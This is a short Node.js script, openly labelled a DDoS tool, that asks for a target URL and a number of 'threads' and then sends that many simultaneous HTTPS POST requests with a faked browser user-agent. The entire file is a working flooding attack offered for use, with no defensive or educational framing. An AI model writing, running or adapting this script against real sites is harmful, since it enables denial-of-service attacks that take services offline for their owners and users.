const readline = require('readline');
const https = require('https');

const USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
let amount = 0;
let url = "";

class Dos {
    constructor() {}

    async startAttack() {
        console.log("Setting DDoS");
        const threads = [];
        for (let i = 0; i < amount; i++) {
            threads.push(this.postAttack(url)); // You can change this to getAttack if needed
        }
        await Promise.all(threads);
        console.log("Main Thread ended");
    }

    async postAttack(url) {
        return new Promise((resolve, reject) => {
            const req = https.request(url, { method: 'POST', headers: { 'User-Agent': USER_AGENT } }, (res) => {
                console.log("Attack response: ", res.statusCode);
                resolve();
            });
            req.end();
            req.on('error', (error) => {
                console.error("Error in attack: ", error);
                reject(error);
            });
        });
    }
}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.question("Enter Target URL: ", (targetUrl) => {
    rl.question("Enter Number of Threads: ", (numThreads) => {
        console.log("Starting Attack to URL: " + targetUrl);
        console.log("Number of Threads: " + numThreads);
        url = targetUrl;
        amount = parseInt(numThreads);

        (async () => {
            const dos = new Dos();
            await dos.startAttack();
            rl.close(); // Close the readline interface
        })();
    });
});
